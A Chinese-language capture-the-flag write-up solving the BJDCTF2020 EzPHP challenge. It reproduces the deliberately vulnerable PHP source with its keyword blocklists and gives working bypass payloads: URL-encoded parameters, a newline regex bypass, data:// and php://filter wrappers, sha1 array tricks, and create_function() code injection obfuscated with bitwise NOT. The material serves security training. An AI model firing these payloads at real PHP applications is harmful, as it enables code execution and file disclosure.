## [BJDCTF2020]EzPHP



![image-20230313173344604](https://s2.loli.net/2023/03/13/3H5UJlWQLYMusoE.png)

js被禁用了，我们按F12看源码，发现base32编码，

解密得：`1nD3x.php`

于是我们访问：`/1nD3x.php` 得到题目源码：

```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?> 
```

分析一下，有几个需要绕过的地方：

#### 一：绕过 `$_SERVER['QUERY_STRING']`

```php
if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
} 
```

首先我们需要知道 `$_SERVER['QUERY_STRING']` 是什么，直白地说是：查询字符串

其实就是URL中?后面的东西，

例如：

```php
localhost?a=12&b=34

$_SERVER['QUERY_STRING'] =>   a=12&b=34
```

这里需要绕过它，看似不可能，其实很简单

我们只需`将url中的参数全部使用url编码即可绕过` ，

> 因为`$_SERVER['QUERY_STRING']` `不会将参数自动进行url解码`，
>
> 但是 `$_GET[]会自动将参数进行url解码`

综上：我们需要将url中所有存在关键字的参数全部urlencode即可绕过





#### 二：绕过 `/^aqua_is_cute$/`

```php
if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
```

我们需要使正则 `/^aqua_is_cute$/` 成立，但是字符串又不等于它，怎么才能做到呢？

我们可以在`字符串结尾加上换行符 %0A 绕过`，**正则不会匹配末尾的换行符**

但是我们正则修改为：`/^aqua_is_cute$/D` 就不能进行绕过了，

因为 **`/D`** 会`修正末尾$对于换行符的匹配` ，

例如：

```php
<?php
$s = $_GET['s'];
if (preg_match("/^abc$/D", $s) && $s !== "abc") {
    echo "nb";
} else {
    echo "loser";
}
```

![image-20230313180406941](https://s2.loli.net/2023/03/13/RKLPxrsNIuWBfUM.png)





#### 三：绕过 `/[a-zA-Z]/`

```php
foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
```

这里使用了 `$_REQUEST` 判断参数值中是否存在字母

这里有一个关于`$_REQUEST 优先级问题`

> 当 `$_GET[]`与`$_POST[]` 中参数名相同时，`$_REQUEST[]` 会有限使用 `$_POST[]` 的值

例如：

```php
<?php
echo $_REQUEST[1];
```

![image-20230313181038979](https://s2.loli.net/2023/03/13/qfKa6AxFdbkmQDl.png)

因此，我们只需在get传参时，同时传入同名的post参数，参数值为数字即可绕过





#### 四：绕过 `file_get_contents($file)`

```php
if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>"); 
```

这个是文件包含漏洞，我们可以使用`data伪协议`

```php
file=data://text/plain,debu_debu_aqua
```



#### 五：绕过 `sha1()`

```php
if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
}
```

`sha1()` 和 `md5()` 一样 ，当我们传入的参数为数组时就会返回 NULL, 即可绕过

```php
shana[]=1&passwd[]=2
```



#### 六：create_function()命令执行



```php
if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
}
```



这里的重点是：

第五点的：

```php
extract($_GET["flag"]);
```

`extract()函数`作用是：将数组值 赋值给数组名同名的变量

我们可以通过这里去产生 `$code`、`$arg` 变量



```php
include "flag.php";
$code('', $arg); 
```

`$code('', $arg); ` 这一句十分重要

由于括号中使用的是逗号，我们一般的命令执行应该使用不了，参数不能控制。

了解到一种新的方法：`create_function()代码注入`

> 从`PHP 7.2.0`开始，`create_function()`被废弃

文章：https://www.cnblogs.com/-chenxs/p/11459374.html

`create_function($arg1,$arg2)`会创造一个匿名函数，

函数的参数部分由 `$arg1`指定

函数体由 `$arg2` 指定

例如：

```php
<?php
create_function('$a,$b', 'return "ln($a) + ln($b) = " . log($a * $b);');
?>
```

会创建以下匿名参数：

```php
function lambda($a,$b){
	return "ln($a) + ln($b) = " . log($a * $b);
}
```

我们可以在 $arg2 进行改动，实现代码注入

如果`$arg2 = }phpinfo();//`   可以执行`phpinfo()`函数

原因：首先 `}` 将匿名函数的大括号`}`闭合了，然后 `//` 将后面的大括号`}`给注释掉了

所以，这之间就可以写相应的代码了

由于这里过滤了很多东西，但是恰好引入了 `flag.php`，其中一定存在相应的flag变量

所以我们可以使用 `get_defined_vars()`函数：返回所有已定义变量组成的数组

然后使用 `var_dump()`进行输出

这样就可以知道有关flag的变量名了

```php
arg=}var_dump(get_defined_vars());//
```



综上：

我们需要将get参数进行url编码，然后将具有字母参数值的所有get参数传入一个同名的post参数(注意需要将请求方式改为post方式)，debu参数在末尾加上%0a绕过，file参数使用data协议绕过，sha1()使用数组绕过

get

```php
/1nD3x.php?f%69%6ce=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&d%65%62u=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&sh%61%6e%61[]=1&pas%73%77d[]=2&f%6c%61%67%5b%63%6fde]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&fl%61%67%5b%61%72g]=%7d%76%61%72%5f%64%75%6d%70%28%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73%28%29%29%3b%2f%2f
```

post

```php
file=1&debu=1
```



![image-20230313193606051](https://s2.loli.net/2023/03/13/FUvIM61D9iuQ7Lo.png)

如图，我们已经输出了所有变量及其值，其中：

```php
$ffffffff11111114ggggg="Baka, do you think it's so easy to get my flag? I hid the real flag in rea1fl4g.php 23333"
```

提示我们flag在 `rea1fl4g.php`

于是我们可以使用文件包含漏洞进行读取flag：

```php
arg=}require(php://filter/convert.base64-encode/resource=rea1fl4g.php);//
```

直接使用url编码是不行的，会有关键字过滤，include也用不了，我们可以使用require

观察一下，没有过滤：`~`，于是我们可以取反构造，

```php
arg=}require(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//
```

最终：

```php
arg=}%72%65%71%75%69%72%65(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//
```

![image-20230313194510663](https://s2.loli.net/2023/03/13/4w58TFSrqiCZxs2.png)

读取到flag

最终payload：（%0a不要进行urlencode）

```php
/1nD3x.php?f%69%6ce=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&d%65%62u=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&sh%61%6e%61[]=1&pas%73%77d[]=2&f%6c%61%67%5b%63%6fde]=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&fl%61%67%5b%61%72g]=}%72%65%71%75%69%72%65(~%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F);//


post:
file=1&debu=1
```









